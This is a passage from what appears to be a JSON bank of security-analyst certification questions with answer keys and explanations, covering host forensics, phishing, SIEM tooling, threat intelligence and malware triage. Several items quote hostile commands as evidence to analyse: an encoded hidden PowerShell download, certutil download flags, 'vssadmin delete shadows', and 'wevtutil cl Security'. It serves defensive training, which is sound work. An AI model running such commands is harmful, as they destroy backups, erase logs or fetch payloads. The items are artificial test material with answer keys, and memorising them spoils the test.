following BEST describes the activity occurring in this command?","o":["A system administrator is renewing the local computer digital certificate.","A living-off-the-land binary is being abused to download an unauthorized executable into a staging directory.","A legitimate Windows update service is validating cryptographic file hashes against the NSRL database.","An enterprise CA is publishing an updated Certificate Revocation List to the local client cache."],"a":1,"e":"Certutil is a native Windows certificate management utility frequently abused as a LOLBin. The flags <code>-urlcache -split -f</code> force the tool to download a remote binary and save it directly to disk (here into <code>C:\\Windows\\Temp\\</code>), completely bypassing conventional browser download monitoring.","l":"c3-host","l2":"","k":""},{"id":"lq:c3-host:2","set":"lq","ch":3,"d":1,"q":"An analyst inspects a live Windows endpoint during an alert investigation and discovers a process named <code>lsass.exe</code> running from <code>C:\\Windows\\System32\\</code>. However, the analyst notes that <code>lsass.exe</code> has spawned a child process: <code>cmd.exe /c whoami</code>. What conclusion should the analyst draw?","o":["The system is operating normally because LSASS verifies administrative credentials during logon.","The system is exhibiting normal behavior associated with Group Policy background processing.","The process is anomalous and indicates malicious credential dumping or process compromise, as LSASS never legitimately spawns child processes.","The command was automatically triggered by the local Security Account Manager to synchronize domain accounts."],"a":2,"e":"Legitimate <code>lsass.exe</code> enforces system security policies and handles authentication tokens, running as SYSTEM from System32. It NEVER spawns child processes. An instance of <code>lsass.exe</code> spawning <code>cmd.exe</code> or any other utility indicates active process injection, exploitation, or credential dumping.","l":"c3-host","l2":"","k":""},{"id":"lq:c3-host:3","set":"lq","ch":3,"d":1,"q":"A security operations team discovers that an attacker gained administrative access to an internal server and executed a utility to wipe the local security event logs. The event viewer displays Windows Event ID 1102. What should the analyst do NEXT to investigate the commands executed prior to log tampering?","o":["Review the centralized SIEM repository for log events forwarded prior to the clearing event.","Execute PowerShell Get-WinEvent to recover unindexed log records from the local pagefile.","Query local Volume Shadow Copies to restore uncorrupted event log files from before the clearing event.","Inspect the local C:\\Windows\\System32\\winevt\\Logs directory for temporary event lock files."],"a":0,"e":"Windows Security Event ID 1102 specifically indicates that the Security audit log was cleared (e.g., using wevtutil cl Security). In enterprise environments configured with centralized SIEM log forwarding or Windows Event Forwarding (WEF), telemetry generated prior to the wiping event was already transmitted off the host in near real time. Reviewing the SIEM datastore is the fastest and most reliable method to reconstruct adversary activity. Option C is tempting because Volume Shadow Copies can restore files, but attackers commonly execute vssadmin delete shadows as part of anti-forensic workflows to prevent snapshot recovery. Options B and D cannot recover deleted event records once the active log file is cleared.","l":"c3-host","l2":"","k":""},{"id":"lq:c3-host:4","set":"lq","ch":3,"d":1,"q":"An incident responder investigates a Linux web server suspected of compromise. The responder identifies an unfamiliar process consuming 98% CPU, but the corresponding executable file on disk in <code>/tmp/</code> was unlinked and deleted by the attacker. How can the responder inspect the deleted running binary image?","o":["Query the /var/log/audit/audit.log file for deleted file system descriptors.","Inspect the /etc/cron.d/ directory for automated execution script triggers.","Access the executable image directly via the virtual path /proc/[PID]/exe.","Execute debugfs to recover unallocated inode block pointers from the ext4 file journal."],"a":2,"e":"On Linux operating systems, the virtual /proc filesystem maintains state information for every running process in memory. When a running binary is unlinked (deleted) from disk, its memory image and open file descriptors remain active until the process terminates. Responders can directly copy and inspect the running binary image via /proc/[PID]/exe (for example, executing 'cp /proc/[PID]/exe /tmp/recovered_sample.bin'). Option D is tempting because filesystem journal carving can recover deleted files, but it is time-consuming, requires taking the volume unmounted/read-only, and risks sector overwrites. Options A and B provide audit and persistence trails but do not provide the raw binary image.","l":"c3-host","l2":"","k":""},{"id":"lq:c3-host:5","set":"lq","ch":3,"d":1,"q":"A threat hunter searches for adversary persistence mechanisms across a Windows domain. Which of the following Windows Security Event IDs specifically indicates that an adversary established persistence by registering a new scheduled task?","o":["Event ID 4688","Event ID 4698","Event ID 7045","Event ID 4720"],"a":1,"e":"Windows Security Event ID 4698 explicitly documents that a scheduled task was created (under the Task Scheduler Operational or Security audit log). Option C is the primary trap: Event ID 7045 (System log) logs the installation of a new Windows Service, which is also a common persistence mechanism, but the question specifically asks for scheduled tasks. Option A (Event ID 4688) records process creation, and Option D (Event ID 4720) records user account creation.","l":"c3-host","l2":"","k":""},{"id":"lq:c3-host:6","set":"lq","ch":3,"d":1,"q":"An analyst detects suspicious command execution in a SIEM alert:<br/><code>powershell.exe -nop -w hidden -enc JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAOwAkAHMALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAA...</code><br/>What technique is the adversary employing, and what is the function of the <code>-nop</code> and <code>-w hidden</code> arguments?","o":["Defense evasion using PowerShell; the flags bypass execution profiles and conceal the console window.","Network scanning using Nmap scripts; the flags randomize port sequences.","Credential dumping via LSASS injection; the flags suppress UAC elevation dialogs.","Persistence establishment via Task Scheduler; the flags trigger daily execution."],"a":0,"e":"This command demonstrates PowerShell abuse for defense evasion. The <code>-nop</code> (NoProfile) switch prevents user profile scripts from executing and alerting monitoring tools, <code>-w hidden</code> hides the command console window from the interactive user, and <code>-enc</code> passes a Base64-encoded Unicode payload.","l":"c3-host","l2":"","k":""},{"id":"lq:c3-host:7","set":"lq","ch":3,"d":1,"q":"During an outbreak investigation, multiple servers experience rapid CPU spikes, abnormal disk I/O with continuous file writes, and process creation logs revealing the command <code>vssadmin delete shadows /all /quiet</code>. What category of attack is actively occurring?","o":["Cryptomining malware deployment","Distributed Denial of Service flood","Active Directory privilege escalation","Ransomware execution with backup recovery destruction"],"a":3,"e":"Continuous massive disk write activity paired with the command <code>vssadmin delete shadows /all /quiet</code> is the definitive behavioral signature of ransomware. Adversaries delete Volume Shadow Copies to prevent victims from restoring encrypted files without paying the ransom.","l":"c3-host","l2":"","k":""},{"id":"lq:c3-host:8","set":"lq","ch":3,"d":1,"q":"A junior administrator notices that workstations in an organization frequently run unauthorized software downloaded by users. Which endpoint control provides the STRONGEST protection by denying all applications by default and allowing only approved, digitally signed software to run?","o":["Software blocklisting via antivirus hash rules","Manual disk inspections using Sysinternals AccessChk","Periodic review of Windows Event ID 11707 MSI installation logs","Application allowlisting via Windows Defender Application Control (WDAC)"],"a":3,"e":"Application allowlisting (enforced through tools like WDAC or AppLocker) operates on a zero-trust model: all software execution is prohibited by default, and only explicitly permitted, verified, or digitally signed binaries are allowed to execute. Blocklisting only stops known bad software.","l":"c3-host","l2":"","k":""},{"id":"lq:c3-cloud-social:1","set":"lq","ch":3,"d":1,"q":"An analyst investigates an alert from Microsoft Entra ID showing a user account successfully authenticated from Atlanta, Georgia, and 25 minutes later authenticated from Tokyo, Japan. Which identity-based indicator is present, and what should be the analyst's FIRST action?","o":["Impossible travel; verify the user's operational context and examine the IP reputation to rule out commercial VPN usage.","Credential stuffing; immediately terminate the user's Active Directory account and wipe their endpoint.","Password spraying; configure a smart lockout policy to block all international IP ranges.","Privilege creep; initiate a formal access review to revoke the user's administrative group memberships."],"a":0,"e":"Impossible travel occurs when an account authenticates from two distant locations within an elapsed time that makes physical transit impossible. The FIRST action is always to verify context and check IP reputation, as approved corporate or personal VPN connections frequently produce false positives.","l":"c3-cloud-social","l2":"","k":""},{"id":"lq:c3-cloud-social:2","set":"lq","ch":3,"d":1,"q":"A security engineer receives an alert from AWS GuardDuty: <code>CryptoCurrency:EC2/BitcoinTool.B</code>. Concurrently, AWS Cost Anomaly Detection flags an unexpected 400% compute spend spike in a rarely used AWS region. Which category of cloud indicator does this represent?","o":["Cloud anomalous activity","Broken object level authorization","Cloud resource compromise","Software supply chain poisoning"],"a":2,"e":"Cloud resource compromise represents confirmed impact where an attacker has successfully taken control of or misused a cloud resource (such as compute hijacking for cryptomining). In contrast, cloud anomalous activity represents the warning or reconnaissance phase.","l":"c3-cloud-social","l2":"","k":""},{"id":"lq:c3-cloud-social:3","set":"lq","ch":3,"d":1,"q":"A financial controller receives an email with the Display Name 'Chief Executive Officer' demanding an urgent $75,000 international wire transfer. The actual sending address is <code>ceo@acme-c0rp.com</code> instead of the legitimate <code>acme-corp.com</code>. SPF, DKIM, and DMARC checks all returned 'PASS'. Why did the email pass authentication?","o":["The attacker compromised the corporate DNS server and altered the legitimate SPF record.","The attacker registered the lookalike domain and correctly configured their own SPF, DKIM, and DMARC records.","The email gateway automatically bypasses authentication checks for messages bearing C-level display names.","The message was delivered using an open redirect on the corporate web portal."],"a":1,"e":"Email authentication protocols (SPF, DKIM, DMARC) validate whether a message conforms to the policies of the domain listed in the envelope/header. Because the attacker legally registered the typosquatted lookalike domain (<code>acme-c0rp.com</code>), they configured valid SPF and DKIM keys for their own server. Authentication only catches domain spoofing, not legitimate lookalike domains.","l":"c3-cloud-social","l2":"","k":""},{"id":"lq:c3-cloud-social:4","set":"lq","ch":3,"d":1,"q":"A web application experiences intermittent slowdowns. Monitoring indicates normal overall network bandwidth, but the backend database reports 100% CPU utilization and thousands of queries taking over 15 seconds to execute against a complex product search endpoint. Which type of service disruption is occurring?","o":["Volumetric UDP reflection flood","API rate limit abuse","Application resource exhaustion","BGP route hijacking"],"a":2,"e":"Resource exhaustion occurs when moderate or low traffic volume targets computationally heavy backend transactions (like expensive database queries or regex calculations), depleting CPU, memory, or connection pools without saturating network bandwidth.","l":"c3-cloud-social","l2":"","k":""},{"id":"lq:c3-cloud-social:5","set":"lq","ch":3,"d":1,"q":"An incident responder reviews the mailbox configuration of an executive whose account was subjected to an Account Takeover (ATO) BEC attack. Which of the following technical configurations is MOST characteristic of adversary persistence in ATO BEC?","o":["Configuring an inbox rule that automatically forwards incoming emails to an external address and moves them to the RSS Subscriptions folder","Enabling DMARC with a policy of <code>p=reject</code> across all inbound MX records","Registering an IDN homograph domain via dnstwist to intercept external DNS traffic","Deploying an open redirect on the corporate marketing website"],"a":0,"e":"Adversaries executing Account Takeover BEC commonly create hidden inbox rules that automatically forward incoming communications (especially financial responses) to an external account and silently divert or delete replies into obscure folders (like RSS Subscriptions or Deleted Items) to keep the legitimate user unaware of the fraudulent activity.","l":"c3-cloud-social","l2":"","k":""},{"id":"lq:c3-cloud-social:6","set":"lq","ch":3,"d":1,"q":"A security analyst is tasked with analyzing raw email headers from a reported phishing message to determine the true originating mail server. How should the analyst interpret the <code>Received:</code> header fields?","o":["Read from top to bottom, as the very first line identifies the originating host.","Read from bottom to top, as each intermediate relay prepends its information above previous hops.","Inspect only the <code>Return-Path:</code> header, as it cannot be modified by external relays.","Filter exclusively for <code>DKIM-Signature</code> headers to extract the originating IPv4 address."],"a":1,"e":"Each mail transfer agent (MTA) that processes an email prepends a new <code>Received:</code> header to the top of the header block. Therefore, the Received headers must be read chronologically from bottom to top to identify the earliest originating mail server.","l":"c3-cloud-social","l2":"","k":""},{"id":"lq:c3-cloud-social:7","set":"lq","ch":3,"d":1,"q":"A SOC analyst observes authentication logs showing a single external IP address attempting to log in to 5,000 distinct employee accounts over a four-hour window, testing the password <code>Autumn2026!</code> exactly once per account before moving to the next. What attack technique is being executed?","o":["Credential stuffing","Pass-the-Hash","BOLA enumeration","Password spraying"],"a":3,"e":"Password spraying attempts a single or small number of common passwords across many user accounts to stay below account lockout thresholds. Credential stuffing, by contrast, tests large lists of known username/password pairs against specific accounts.","l":"c3-cloud-social","l2":"","k":""},{"id":"lq:c3-cloud-social:8","set":"lq","ch":3,"d":1,"q":"An analyst must evaluate a suspicious shortened URL (https://bit.ly/3xY9qZ) found in an email without exposing enterprise systems to malware or notifying the adversary. Which tool and methodology should the analyst use?","o":["Navigate to the shortened URL using an incognito window on a corporate workstation to inspect response headers","Perform a recursive WHOIS query against the URL shortening provider to identify the final destination IP address","Download the landing page using a curl script executed from an internal production application server","Submit the shortened URL to URLScan.io to inspect the redirect chain and page render in a sandbox"],"a":3,"e":"Suspicious links should never be opened directly on production endpoints. URLScan.io loads the URL in an isolated sandbox, following the entire HTTP redirect chain, logging outbound network requests, and capturing screenshot renders without risking malware infection or revealing corporate IP addresses to the adversary. WHOIS queries only inspect the registrar of bit.ly rather than the shortened destination.","l":"c3-cloud-social","l2":"","k":""},{"id":"lq:c3-tools:1","set":"lq","ch":3,"d":1,"q":"A security responder has remote SSH command-line access to a headless Linux server with no graphical desktop environment and must capture network packets for offline forensic inspection. Which tool is BEST suited for this task?","o":["tcpdump","Wireshark","Zeek","tshark"],"a":0,"e":"tcpdump is the standard command-line packet analyzer available on virtually all Unix/Linux systems, making it the ideal tool to capture raw packets into a PCAP file on a headless server. Option D is tempting because tshark is the terminal-based counterpart to Wireshark, but tshark is rarely installed by default on production Linux servers due to package dependencies, whereas tcpdump is lightweight and ubiquitous. Option B (Wireshark) requires a GUI, and Option C (Zeek) generates structured protocol transaction logs rather than raw packet captures.","l":"c3-tools","l2":"","k":""},{"id":"lq:c3-tools:2","set":"lq","ch":3,"d":1,"q":"An analyst inspecting a network packet capture observes an unusually high volume of outbound DNS queries directed to a single external second-level domain. Each query contains a randomized high-entropy alphanumeric subdomain string, and the server returns identical TXT record payloads. What is the BEST next step?","o":["Deploy a firewall rule to block all outbound UDP port 53 traffic enterprise-wide.","Inspect DNS conversation streams and payload sizes for evidence of DNS tunneling and C2 beaconing.","Execute an inverse ARP resolution to verify the MAC address of the authoritative nameserver.","Export raw packet hex streams into CyberChef to decrypt external TLS handshake sessions."],"a":1,"e":"High-volume DNS queries featuring randomized subdomains and consistent TXT record responses are classic indicators of DNS tunneling (used for data exfiltration or C2 communications). The analyst must inspect query and response payload conversations in Wireshark or Zeek to confirm malicious payload encoding. Option A is tempting because blocking the port halts traffic, but blocking port 53 enterprise-wide breaks core network name resolution for the entire organization. Option C is a Layer 2 local network check irrelevant to external domains, and Option D is ineffective because CyberChef cannot decrypt TLS sessions without private session keys.","l":"c3-tools","l2":"","k":""},{"id":"lq:c3-tools:3","set":"lq","ch":3,"d":1,"q":"Which network security deployment can actively analyze live traffic streams and automatically terminate or drop packets matching known exploit signatures in real time?","o":["A passive network TAP forwarding to a Zeek sensor","A Wireshark analyzer connected to a switch SPAN port","An inline Intrusion Prevention System (IPS) configured with drop actions","An out-of-band Intrusion Detection System (IDS) generating SIEM alerts"],"a":2,"e":"An inline Intrusion Prevention System (IPS) sits directly in the physical or logical network traffic path. When a packet stream matches an attack signature, the IPS can drop matching packets, reset TCP sessions, or block the source IP before traffic reaches the destination. Option D is the primary trap: an out-of-band IDS monitors traffic passively via a SPAN port or TAP and can send alerts or out-of-band TCP resets, but cannot reliably prevent single-packet exploits inline. Options A and B are passive monitoring and analysis tools that have no inline packet-blocking capability.","l":"c3-tools","l2":"","k":""},{"id":"lq:c3-tools:4","set":"lq","ch":3,"d":1,"q":"Which filter selects HTTP POST requests?","o":["tcp.port == 53","ip.addr == 192.0.2.1","tcp.flags.syn == 1","http.request.method == \"POST\""],"a":3,"e":"The HTTP method filter specifically selects POST requests.","l":"c3-tools","l2":"","k":""},{"id":"lq:c3-tools:5","set":"lq","ch":3,"d":1,"q":"Which tool logs DNS, HTTP, TLS, and connections without requiring signatures?","o":["Zeek","Snort","Suricata IPS","tcpdump"],"a":0,"e":"Zeek is the passive behavioral network monitor; the others are signature engines or packet capture.","l":"c3-tools","l2":"","k":""},{"id":"lq:c3-tools:6","set":"lq","ch":3,"d":1,"q":"A scheduled internal vulnerability scanner generates thousands of high-severity alerts in the SIEM during its weekly assessment window, overwhelming the on-call analyst queue. What should the security analyst recommend FIRST?","o":["Permanently disable the port scanning and authentication failure signature categories in the SIEM.","Add a documented correlation rule exception or suppression window specifically for the scanner IP address.","Increase the global SIEM alert threshold by 200% across all enterprise security detection rules.","Reconfigure the vulnerability scanner to execute scans exclusively against external perimeter IP addresses."],"a":1,"e":"When legitimate administrative tools generate excessive noise, the proper resolution is rule tuning: implementing documented rule exceptions or time-based suppression windows for the scanner IP during authorized scanning hours. Option A is tempting because it immediately eliminates alerts, but permanently disabling signature categories blinds the SOC to real port scans and brute-force attacks across the entire organization. Option C degrades overall detection fidelity, and Option D fails to assess critical internal server vulnerabilities.","l":"c3-tools","l2":"","k":""},{"id":"lq:c3-tools:7","set":"lq","ch":3,"d":1,"q":"During authentication log triage, an analyst observes forty failed login attempts across different user accounts originating from a single external IP address over a fifteen-minute window, followed by a successful authentication on an executive account. What does this pattern MOST likely indicate?","o":["Credential stuffing replaying exposed username-password pairs from a third-party breach","Distributed Denial of Service (DDoS) targeting the corporate identity provider","Password spraying attempting common passwords against numerous accounts to evade lockouts","Pass-the-hash execution propagating laterally across internal domain workstations"],"a":2,"e":"Password spraying involves testing a single or few common passwords (e.g., Spring2026!) against multiple user accounts over an extended window to avoid triggering individual account lockout thresholds. Option A is the most common distractor: credential stuffing attempts pairs of known credentials from breach dumps, which typically generates numerous failed attempts per individual account rather than testing many different accounts from one source with a low failure count per user. Option B aims to exhaust system capacity, and Option D is an internal lateral movement technique using NTLM hashes rather than external password logon attempts.","l":"c3-tools","l2":"","k":""},{"id":"lq:c3-tools:8","set":"lq","ch":3,"d":1,"q":"An analyst captures network traffic on a gateway using the command: tcpdump -i eth0 -w traffic.pcap \"tcp port 80\". When opening traffic.pcap in Wireshark, the analyst applies the display filter \"dns\" to investigate domain resolution events. Why does Wireshark display zero matching packets?","o":["Wireshark display filters require an active DNS reverse lookup plugin to evaluate UDP datagrams.","The capture file must be converted to PCAPNG format before Wireshark display filters can parse protocols.","Wireshark display filters cannot evaluate application layer payloads when captured in promiscuous mode.","The capture filter permanently excluded all non-matching packets during collection, so DNS traffic was never saved."],"a":3,"e":"Capture filters (specified in BPF syntax during packet collection via tcpdump or dumpcap) drop non-matching packets at the kernel level before they are written to disk. Because the capture filter was restricted to \"tcp port 80\", UDP port 53 DNS packets were never captured into the file. Wireshark display filters only filter packets already present in the PCAP; they cannot reconstruct traffic that was excluded during capture. Option A is tempting because Wireshark has resolution plugins, but plugins parse data already captured. Options B and C are false regarding PCAP format and promiscuous mode.","l":"c3-tools","l2":"","k":""},{"id":"lq:c3-tools:9","set":"lq","ch":3,"d":1,"q":"A string uses letters, digits, plus, slash, and equals padding. Which operation is MOST likely?","o":["From Base64","Gunzip","From Hex","URL Decode"],"a":0,"e":"That character set and padding are characteristic of Base64.","l":"c3-tools","l2":"","k":""},{"id":"lq:c3-tools:10","set":"lq","ch":3,"d":1,"q":"An international enterprise must comply with regional data sovereignty regulations requiring raw security telemetry to remain within host country borders, while enabling central SOC engineers to perform unified global threat correlation and search queries. Which SIEM architecture BEST satisfies these requirements?","o":["A single centralized on-premises SIEM repository deployed at corporate headquarters","A hybrid architecture with distributed local log storage and centralized analytics querying","A cloud-native SaaS SIEM streaming all endpoint logs directly to a single multi-tenant data center","A completely isolated standalone SIEM instance in each country with zero external connectivity"],"a":1,"e":"A hybrid SIEM architecture utilizes distributed local forwarders and regional storage clusters to retain raw event logs within specific national boundaries (satisfying data sovereignty laws), while providing a federated cloud management plane that executes centralized searches, dashboarding, and correlation rules across the distributed datasets. Option A is tempting for centralized control, but streaming international data to a single central headquarters violates regional sovereignty laws (e.g., GDPR data transfer restrictions). Option C suffers from the same compliance violation. Option D satisfies sovereignty but isolates SOC visibility into unmanageable regional silos.","l":"c3-tools","l2":"","k":""},{"id":"lq:c3-tip-edr:1","set":"lq","ch":3,"d":1,"q":"A security analyst investigates an outbound connection from an internal workstation to an unfamiliar external IP address. A query in AbuseIPDB returns zero reported abuse records and a confidence score of 0%. How should the analyst interpret this finding?","o":["The IP address is not proven safe; the analyst must corroborate with WHOIS, domain registration age, and endpoint telemetry","The IP address is confirmed benign and should be added to the enterprise perimeter firewall allowlist","The zero abuse score confirms that the destination belongs to a legitimate commercial content delivery network","The IP address is definitely an active internal proxy node that was misclassified by network boundary logging"],"a":0,"e":"A zero score or lack of reports in a threat intelligence database like AbuseIPDB simply means that the community has not yet submitted abuse reports for that address; it does not prove the IP is benign. Novel adversary infrastructure or targeted attacks rarely appear on public reputation lists immediately. Analysts must correlate threat feeds with domain age, WHOIS ownership, and internal endpoint behavior.","l":"c3-tip-edr","l2":"","k":""},{"id":"lq:c3-tip-edr:2","set":"lq","ch":3,"d":1,"q":"During an incident investigation, an analyst identifies an endpoint communicating with an unknown external domain (corp-systemupdates.com). The analyst needs to determine the domain's registration creation date, registrar organization, and designated authoritative nameservers. Which protocol or tool should the analyst query FIRST?","o":["AbuseIPDB reputation lookup","WHOIS protocol query","Endpoint Detection and Response (EDR) process tree","Malware Information Sharing Platform (MISP) taxonomy search"],"a":1,"e":"WHOIS queries domain registration databases to retrieve creation dates, expiration dates, sponsoring registrars, and authoritative nameservers. AbuseIPDB provides IP abuse history, EDR provides endpoint host activity, and MISP facilitates threat indicator sharing.","l":"c3-tip-edr","l2":"","k":""},{"id":"lq:c3-tip-edr:3","set":"lq","ch":3,"d":1,"q":"An identity provider flags an impossible travel alert after an employee account authenticates from Los Angeles, California, and 15 minutes later from Tokyo, Japan. Which set of telemetry provides the BEST evidence to determine whether this indicates credential compromise or corporate VPN usage?","o":["The user's assigned Active Directory security groups and department title","The local domain controller's Kerberos Ticket Granting Service (TGS) encryption ciphers","Authentication timestamps, source IP addresses, ISP Autonomous System Numbers (ASNs), and MFA prompt responses","The endpoint's local DHCP lease duration and subnet default gateway MAC address"],"a":2,"e":"Evaluating impossible travel anomalies requires analyzing exact authentication timestamps, source IP addresses, ASN/ISP data (which reveal corporate VPN exits or commercial cloud proxies vs residential ISPs), and MFA telemetry (such as whether MFA was satisfied via push notification or bypassed). AD groups, Kerberos ciphers, and DHCP leases do not provide geographic or session routing context.","l":"c3-tip-edr","l2":"","k":""},{"id":"lq:c3-tip-edr:4","set":"lq","ch":3,"d":1,"q":"A malicious email attachment launches a PowerShell script, modifies registry Run keys, and initiates outbound network connections. Which defensive tool provides the detailed endpoint process tree, parent-child execution lineage, and local timeline necessary to investigate this attack?","o":["WHOIS registration database","GeoIP location mapping service","AlienVault Open Threat Exchange (OTX)","Endpoint Detection and Response (EDR)"],"a":3,"e":"EDR sensors continuously record low-level endpoint telemetry, allowing analysts to visualize parent-child process relationships (such as winword.exe spawning powershell.exe), registry modifications, file writes, and network connections in a unified timeline. WHOIS, GeoIP, and OTX provide external domain and threat intelligence rather than local endpoint execution telemetry.","l":"c3-tip-edr","l2":"","k":""},{"id":"lq:c3-tip-edr:5","set":"lq","ch":3,"d":1,"q":"A SOC team wants to correlate telemetry across endpoints, email gateways, identity providers, and cloud workloads into a single, cohesive incident storyline to reduce alert fatigue. Which technology BEST fulfills this requirement?","o":["Extended Detection and Response (XDR)","A standalone host-based antivirus scanner","A passive network packet sniffer (tcpdump)","A local threat intelligence platform (TIP)"],"a":0,"e":"Extended Detection and Response (XDR) ingests and correlates telemetry across multiple security layers (including endpoints, email security, cloud infrastructure, and identity providers) into unified multi-vector incidents. EDR is limited to endpoints, tcpdump captures raw packets without cross-layer correlation, and a TIP manages threat indicators rather than correlated telemetry.","l":"c3-tip-edr","l2":"","k":""},{"id":"lq:c3-tip-edr:6","set":"lq","ch":3,"d":1,"q":"A threat intelligence analyst needs an open-source platform that structures cyber threat intelligence as a knowledge graph, linking threat actors, campaigns, malware families, and ATT&CK techniques using the STIX 2.1 standard. Which platform fits this description?","o":["AbuseIPDB","OpenCTI","AlienVault OTX","Mobile Device Management (MDM)"],"a":1,"e":"OpenCTI is an open-source threat intelligence platform designed around a STIX 2.1 knowledge graph that maps complex relationships between adversaries, attack campaigns, malware tools, and MITRE ATT&CK techniques. AbuseIPDB tracks IP reputation, AlienVault OTX organizes indicators into community pulses, and MDM manages mobile hardware.","l":"c3-tip-edr","l2":"","k":""},{"id":"lq:c3-tip-edr:7","set":"lq","ch":3,"d":1,"q":"An organization needs a threat intelligence sharing platform to exchange sensitive Indicators of Compromise (IoCs) with vetted industry partners while enforcing strict Traffic Light Protocol (TLP) tags and granular synchronization rules. Which platform is BEST suited for this role?","o":["GeoIP lookup service","Endpoint Detection and Response (EDR)","Malware Information Sharing Platform (MISP)","Public WHOIS directory"],"a":2,"e":"MISP (Malware Information Sharing Platform) is specifically designed for structured, trusted sharing of threat intelligence, indicators, and vulnerability data among organizations, featuring native support for TLP markings, cryptographic signing, and community distribution matrices. EDR, GeoIP, and WHOIS do not support partner-to-partner collaborative intelligence sharing.","l":"c3-tip-edr","l2":"","k":""},{"id":"lq:c3-tip-edr:8","set":"lq","ch":3,"d":1,"q":"An inbound email arrives from a lookalike typosquatted domain (example-support.com instead of example.com) containing an urgent request to verify employee credentials. The email security gateway shows that SPF, DKIM, and DMARC all passed. How should the analyst proceed?","o":["Delete the domain's SPF and DKIM public keys from DNS to break future email deliverability","Mark the email as authentic and release it to the recipient because cryptographic authentication passed","Inspect only the message display name and allow the email if it matches an internal employee name","Investigate the domain registration history, creation date, and embedded link targets before taking action"],"a":3,"e":"Passing SPF, DKIM, and DMARC only verifies that the email originated from a server authorized by the domain listed in the header (example-support.com). If an attacker purchases a typosquatted domain and configures their own DNS records, authentication will pass completely. The analyst must inspect the domain's age, WHOIS registrant, and payload URLs to detect the phishing attempt.","l":"c3-tip-edr","l2":"","k":""},{"id":"lq:c3-filesandbox:1","set":"lq","ch":3,"d":1,"q":"A Tier 1 analyst receives a suspicious, unclassified email attachment labeled \"Q3_Financial_Projections.xlsx\" from an external sender. The document may contain confidential corporate merger data and has never been seen previously on the corporate network. What is the BEST first triage action?","o":["Calculate the cryptographic SHA-256 hash and query commercial threat intelligence repositories.","Upload the raw file attachment to a public multi-engine malware scanning platform.","Execute the document attachment in a test virtual machine connected to the local office subnet.","Forward the email and raw attachment to external partner security lists for peer review."],"a":0,"e":"Computing the file hash (e.g., SHA-256) and searching threat intelligence platforms (such as VirusTotal or internal TIPs) allows the analyst to check for known malicious activity without exposing the actual file contents. Option B is a dangerous operational trap: uploading an unknown document containing proprietary or confidential corporate data to public sandboxes permanently exposes the contents to third-party researchers and competitor intelligence scrapers. Option C risks malware propagating laterally across the local network if sandbox isolation is imperfect. Option D breaches corporate data confidentiality.","l":"c3-filesandbox","l2":"","k":""},{"id":"lq:c3-filesandbox:2","set":"lq","ch":3,"d":1,"q":"An analyst examines a suspicious file named \"Annual_Benefits_Summary.pdf\" received by human resources. Inspecting the file in a hex editor reveals that the first two bytes of the file are 4D 5A (ASCII characters \"MZ\"). What should the analyst conclude?","o":["The file is an authentic PDF document with corrupted header metadata.","The file is a Windows Portable Executable (PE) binary disguising its identity with a spoofed extension.","The file is an encrypted archive using modern Gzip compression headers.","The file is an Adobe PostScript document requiring a custom rasterizer."],"a":1,"e":"File extensions in Windows are easily spoofed. The magic byte sequence 4D 5A (MZ) is the signature of a Windows Portable Executable (PE) binary (such as an EXE, DLL, or SCR file), named after Mark Zbikowski. Legitimate PDF files begin with magic bytes 25 50 44 46 (%PDF). Attackers routinely append .pdf to executable names to trick users into double-clicking them. Option A is tempting because file headers can corrupt, but the MZ signature specifically denotes an executable binary rather than damaged document formatting. Options C and D have completely different magic byte signatures (e.g., 1F 8B for Gzip).","l":"c3-filesandbox","l2":"","k":""},{"id":"lq:c3-filesandbox:3","set":"lq","ch":3,"d":1,"q":"During static analysis of an unknown binary, the analyst runs the \"strings\" utility and finds almost no readable ASCII strings. A file entropy calculation returns a score of 7.82, and a hash lookup returns zero hits across all threat intelligence databases. What is the BEST next step for the analyst?","o":["Classify the sample as benign because the hash does not match any known malicious signatures.","Add the binary SHA-256 hash to the corporate endpoint allowlist to eliminate future false positives.","Submit the binary to an isolated internal dynamic sandbox to observe runtime behavior and memory unpacking.","Decompile the binary directly using standard Java reverse-engineering disassemblers."],"a":2,"e":"A high entropy score (near the theoretical maximum of 8.0) combined with an absence of readable strings strongly indicates that the executable has been packed, compressed, or encrypted (using tools like UPX or custom crypters) to evade signature detection. Because the hash is unknown (a potential zero-day or custom compilation), dynamic behavioral analysis in an isolated sandbox is required to execute the file in memory and observe its behavior after it unpacks itself. Option A is the classic false-negative trap: zero detections simply means the specific hash is novel, not clean. Option B dangerously whitelists an unverified packed binary. Option D is ineffective because native PE binaries cannot be disassembled with Java bytecode tools.","l":"c3-filesandbox","l2":"","k":""},{"id":"lq:c3-filesandbox:4","set":"lq","ch":3,"d":1,"q":"A threat hunter needs to create a YARA rule to detect newly compiled variants of a proprietary malware family, even when attackers recompile the source code to alter the file hash and change file extensions. What should the rule \"strings\" and \"condition\" sections prioritize?","o":["Matching exact SHA-256 and MD5 cryptographic hashes calculated from the initial sample","Filtering based on file size boundaries and target installation folder paths in the filesystem","Detecting distinctive byte sequences, imported API function combinations, and unique text patterns","Validating code signing digital certificate serial numbers issued by commercial public CAs"],"a":2,"e":"YARA is a pattern-matching tool designed to classify malware based on textual or binary patterns. By matching unique strings, hardcoded configuration keys, decryption stubs, or distinctive imported API function combinations, YARA rules reliably detect variants across an entire malware family regardless of file renames, hash changes, or minor recompilation. Option A is tempting because hashes provide certainty, but file hashes change with any minor code alteration, defeating the purpose of YARA. Options B and D are easily altered by attackers and provide weak, non-durable detection.","l":"c3-filesandbox","l2":"","k":""},{"id":"lq:c3-filesandbox:5","set":"lq","ch":3,"d":1,"q":"A security analyst submits an unknown sample to an automated dynamic sandbox. The sandbox execution report marks the file as benign with zero network connections or dropped files. However, preliminary static analysis identified imported API functions for process injection (VirtualAllocEx, WriteProcessMemory) and run-key registry modifications. What is the MOST likely explanation?","o":["The malware sample detected the sandbox virtual environment and deliberately suppressed its execution.","The static analysis disassembly utility produced false positives due to compiler optimization anomalies.","Automated sandbox dynamic reports are authoritative and supersede all static indicator findings.","The imported memory injection APIs are standard operating system defaults used by all non-malicious binaries."],"a":0,"e":"Modern malware frequently includes anti-analysis and sandbox evasion techniques. By checking for virtualization artifacts (such as VMware/VirtualBox drivers, hypervisor CPU instructions, low screen resolutions, or absence of human mouse movement), the malware detects it is running inside an analysis VM and halts execution or enters an infinite sleep loop. Analysts must combine dynamic findings with static code analysis. Option C is the primary trap: relying blindly on a clean sandbox report allows evasive 